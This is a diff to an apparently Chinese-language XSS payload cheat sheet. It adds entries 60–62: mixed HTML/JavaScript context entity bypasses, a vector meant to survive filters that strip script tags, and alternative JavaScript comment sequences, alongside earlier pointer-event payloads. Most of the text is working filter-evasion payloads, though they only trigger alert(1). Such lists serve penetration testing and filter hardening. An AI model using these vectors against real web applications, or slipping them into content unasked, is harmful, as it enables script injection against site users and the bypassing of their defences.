@@ -431,7 +431,29 @@ hdmFzY3JpcHQ6YWxlcnQoMSkiLz48L3N2Zz4=%23x>
 <x onpointerup=alert(1)>hover this!
 <x onpointerrawupdate=alert(1)>hover this!
 ```
-**60.**
+**60.Mixed Context Reflection Entity Bypass (反射实体混合上下文绕过)** <br>
+以下payload用于在实际有效的js代码中的脚本块中转换特定的代码。它需要以在HTML和javascript上下文标签这种顺序执行，并且相关联彼此。<br>
+这个svg标记将使下一个脚本块中的单引号编码为`&#39;`或`&apos;`，并触发弹窗。<br>
+以下javascript场景的payload，分别为：<br>
+消除单引号、完全转义单引号、消除双引号和完全转义双引号 <br>
+```
+">'-alert(1)-'<svg>
+">&#39-alert(1)-&#39<svg>
+">alert(1)-"<svg>
+"&#34>alert(1)-&#34<svg>
+```
+**61.Strip-My-Script Vector (去除脚本向量)** <br>
+以下payload用于欺骗xss过滤器,用于去除最经典和最知名的XSS payload,它的工作原理是"<script>"标签被删除。 <br>
+```
+<svg/on<script><script>load=alert(1)//</script>  
+```
+
+**62.Javascript Alternative Comments (Javascript注释替代)** <br>
+以下payload用于,当不允许、转义或删除常规javascript注释（//）时使用。<br>
+```
+<!--
+%0A-->
+```
 
 ## 致谢
 **英文议题作者：** <br>
